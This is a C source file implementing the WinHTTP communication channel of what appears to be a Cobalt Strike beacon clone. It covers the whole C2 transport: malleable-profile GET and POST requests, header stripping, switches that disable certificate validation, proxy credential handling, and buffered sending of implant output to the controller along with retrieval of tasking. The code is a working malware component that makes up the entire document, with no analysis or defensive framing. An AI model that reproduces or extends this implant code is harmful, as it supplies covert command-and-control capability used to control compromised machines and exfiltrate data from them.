/*
 * HTTP channel via WinHTTP (CS 4.9 winhttpb*.dll family).
 * Same http_* surface as channel.cpp (WinINet). Compile exactly one of the two.
 */
#include "channel.h"
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include "tokens.h"
#include "profile.h"
#include "beacon.h"
#include "track_memory.h"
#include "hostprof.h"
#include "channel_http_common.h"

#pragma comment(lib, "winhttp")
#pragma comment(lib, "ws2_32")


#define PROXYB_MANUAL 0
#define PROXYB_DIRECT 1
#define PROXYB_PRECONFIG 2
#define PROXYB_MANUAL_CREDS 4

extern sessdata bigsession;

static HINTERNET session_h = NULL;
static HINTERNET connect_h = NULL;

static char * http_post_buffer = NULL;
int http_post_len = 0;

static DWORD httpflags;
static WCHAR http_host_w[256];

#define MAX_HTTP_POST (1024 * 1024 * 2)

static int to_wide(const char * src, WCHAR * dst, int dstch) {
	if (dst == NULL || dstch <= 0)
		return 0;
	dst[0] = 0;
	if (src == NULL || src[0] == '\0')
		return 0;
	return MultiByteToWideChar(CP_ACP, 0, src, -1, dst, dstch);
}

void CALLBACK fixRequestLate(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
	(void)dwContext;
	(void)lpvStatusInformation;
	(void)dwStatusInformationLength;
	if (dwInternetStatus == WINHTTP_CALLBACK_STATUS_SENDING_REQUEST) {
		char * rem = setting_ptr(SETTING_HEADERS_REMOVE);
		if (rem != NULL && rem[0] != '\0') {
			WCHAR wrem[1024];
			if (to_wide(rem, wrem, 1024) > 0)
				WinHttpAddRequestHeaders(hInternet, wrem, (DWORD)-1, WINHTTP_ADDREQ_FLAG_REPLACE);
		}
	}
}

void http_init(char * host, int port, char * ua) {
	unsigned long timeout = 240000;
	DWORD access;
	WCHAR wua[512];
	WCHAR wproxy[512];
	LPCWSTR proxy = WINHTTP_NO_PROXY_NAME;
	LPCWSTR bypass = WINHTTP_NO_PROXY_BYPASS;

	token_guard_start();

	httpflags = IS_HTTPS ? WINHTTP_FLAG_SECURE : 0;

	to_wide(ua, wua, 512);
	wproxy[0] = 0;

	switch (setting_short(SETTING_PROXY_BEHAVIOR)) {
		case PROXYB_PRECONFIG:
			access = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
			break;
		case PROXYB_DIRECT:
			access = WINHTTP_ACCESS_TYPE_NO_PROXY;
			break;
		case PROXYB_MANUAL:
		case PROXYB_MANUAL_CREDS:
			access = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
			if (to_wide(setting_ptr(SETTING_PROXY_CONFIG), wproxy, 512) > 0)
				proxy = wproxy;
			break;
		default:
			access = WINHTTP_ACCESS_TYPE_NO_PROXY;
			break;
	}

	session_h = WinHttpOpen(wua, access, proxy, bypass, 0);
	if (session_h != NULL) {
		WinHttpSetOption(session_h, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
		WinHttpSetOption(session_h, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
	}

	memset(http_current_host, 0, sizeof(http_current_host));
	memset(http_host_w, 0, sizeof(http_host_w));
	if (host != NULL) {
		strncpy(http_current_host, host, sizeof(http_current_host) - 1);
		to_wide(host, http_host_w, 256);
	}
	connect_h = WinHttpConnect(session_h, http_host_w, (INTERNET_PORT)port, 0);

	token_guard_stop();
}

void http_close() {
	token_guard_start();
	if (connect_h) {
		WinHttpCloseHandle(connect_h);
		connect_h = NULL;
	}
	if (session_h) {
		WinHttpCloseHandle(session_h);
		session_h = NULL;
	}
	token_guard_stop();
}

static void fixRequest(HINTERNET request) {
	DWORD flags;

	if (IS_HTTPS) {
		flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
			| SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
			| SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
		WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
	}

	if (setting_ptr(SETTING_HEADERS_REMOVE) != NULL)
		WinHttpSetStatusCallback(request, fixRequestLate, WINHTTP_CALLBACK_FLAG_SEND_REQUEST, 0);

	if (setting_short(SETTING_PROXY_BEHAVIOR) == PROXYB_MANUAL_CREDS) {
		WCHAR wuser[256];
		WCHAR wpass[256];
		to_wide(setting_ptr(SETTING_PROXY_USER), wuser, 256);
		to_wide(setting_ptr(SETTING_PROXY_PASSWORD), wpass, 256);
		WinHttpSetCredentials(request, WINHTTP_AUTH_TARGET_PROXY, WINHTTP_AUTH_SCHEME_BASIC, wuser, wpass, NULL);
		WinHttpSetCredentials(request, WINHTTP_AUTH_TARGET_PROXY, WINHTTP_AUTH_SCHEME_NTLM, wuser, wpass, NULL);
	}
}

static BOOL http_request_isOK(HINTERNET request) {
	DWORD statusCode = 0;
	DWORD size = sizeof(statusCode);
	if (!WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
			WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &size, WINHTTP_NO_HEADER_INDEX))
		return FALSE;
	return statusCode == 200;
}

static BOOL http_send(HINTERNET request, profile * p) {
	WCHAR whdr[2048];
	DWORD hdrlen = 0;
	LPCWSTR extra = WINHTTP_NO_ADDITIONAL_HEADERS;
	LPVOID body = WINHTTP_NO_REQUEST_DATA;
	DWORD blen = 0;

	if (p->headers != NULL && p->headers[0] != '\0') {
		if (to_wide(p->headers, whdr, 2048) > 0) {
			extra = whdr;
			hdrlen = (DWORD)-1;
		}
	}
	if (p->buffer != NULL && p->blen > 0) {
		body = p->buffer;
		blen = (DWORD)p->blen;
	}
	if (!WinHttpSendRequest(request, extra, hdrlen, body, blen, blen, 0))
		return FALSE;
	if (!WinHttpReceiveResponse(request, NULL))
		return FALSE;
	return TRUE;
}

void http_post_maybe(char * hook) {
	WCHAR wverb[16];
	WCHAR wuri[1024];
	char myuri[1024] = {0};
	char myid[128] = {0};
	HINTERNET request;
	profile myprofile = {0};
	DWORD retry;

	if (http_post_len == 0)
		return;

	_snprintf(myid, 128, "%d", bigsession.myid);
	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_POSTREQ,
	                      myid, (int)strlen(myid), http_post_buffer, http_post_len, 1);

	to_wide(setting_ptr(SETTING_C2_VERB_POST), wverb, 16);
	to_wide(myuri, wuri, 1024);

	token_guard_start();
	for (retry = 0; retry < 4; retry++) {
		request = WinHttpOpenRequest(connect_h, wverb, wuri, NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES, httpflags);
		if (request == NULL) {
			Sleep(500);
			continue;
		}
		fixRequest(request);
		if (http_send(request, &myprofile) && http_request_isOK(request)) {
			WinHttpCloseHandle(request);
			break;
		}
		WinHttpCloseHandle(request);
		Sleep(500);
	}
	profile_free(&myprofile, http_post_len);
	http_post_len = 0;
	token_guard_stop();
}

void http_put(char * hook, void * buffer, int len, BOOL postNow) {
	unsigned int flen = 0;

	if (http_post_buffer == NULL) {
		http_post_buffer = (char *)malloc(sizeof(char) * MAX_HTTP_POST);
		track_memory_add(http_post_buffer, sizeof(char) * MAX_HTTP_POST, TRACK_MEMORY_MALLOC, TRUE, NULL);
	}

	if ((len + (int)sizeof(unsigned int)) > MAX_HTTP_POST)
		return;
	else if ((http_post_len + len + (int)sizeof(unsigned int)) > MAX_HTTP_POST)
		http_post_maybe(hook);

	flen = htonl(len);
	memcpy((void *)(http_post_buffer + http_post_len), (void *)&flen, sizeof(unsigned int));
	http_post_len += sizeof(unsigned int);
	memcpy((void *)(http_post_buffer + http_post_len), buffer, len);
	http_post_len += len;

	if (postNow)
		http_post_maybe(hook);
}

int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
	WCHAR wverb[16];
	WCHAR wuri[1024];
	HINTERNET request;
	DWORD avail = 0;
	DWORD downloaded = 0;
	unsigned int read = 0;
	profile myprofile = {0};
	char myuri[1024] = {0};

	http_assemble_request(&myprofile, myuri, hook, SETTING_C2_REQUEST,
	                      meta->data, meta->length, NULL, 0, 0);

	to_wide(setting_ptr(SETTING_C2_VERB_GET), wverb, 16);
	to_wide(myuri, wuri, 1024);

	request = WinHttpOpenRequest(connect_h, wverb, wuri, NULL, WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, httpflags);
	if (request == NULL) {
		profile_free(&myprofile, meta->length);
		return -1;
	}
	fixRequest(request);
	if (!http_send(request, &myprofile)) {
		profile_free(&myprofile, meta->length);
		WinHttpCloseHandle(request);
		return -1;
	}
	profile_free(&myprofile, meta->length);

	if (!http_request_isOK(request)) {
		WinHttpCloseHandle(request);
		return -1;
	}

	if (!WinHttpQueryDataAvailable(request, &avail) || avail >= (DWORD)max) {
		WinHttpCloseHandle(request);
		return -1;
	}
	if (avail == 0) {
		WinHttpCloseHandle(request);
		return 0;
	}

	while (read < (unsigned int)max) {
		/* same tail guard as the WinINet side: clamp the request to the
		 * space left so a chatty server cannot push us past 'max' */
		if (!WinHttpReadData(request, buffer + read, (unsigned int)max - read, &downloaded))
			break;
		if (downloaded == 0)
			break;
		read += downloaded;
	}

	if (read >= (unsigned int)max) {
		WinHttpCloseHandle(request);
		return -1;
	}

	WinHttpCloseHandle(request);
	read = recover(setting_ptr(SETTING_C2_RECOVER), (int)setting_length(SETTING_C2_RECOVER), buffer, read, max);
	return (int)read;
}

int http_get(char * hook, void * cookie, char * buffer, int max) {
	int rv;
	token_guard_start();
	rv = _http_get(hook, (sessdata *)cookie, buffer, max);
	token_guard_stop();
	return rv;
}
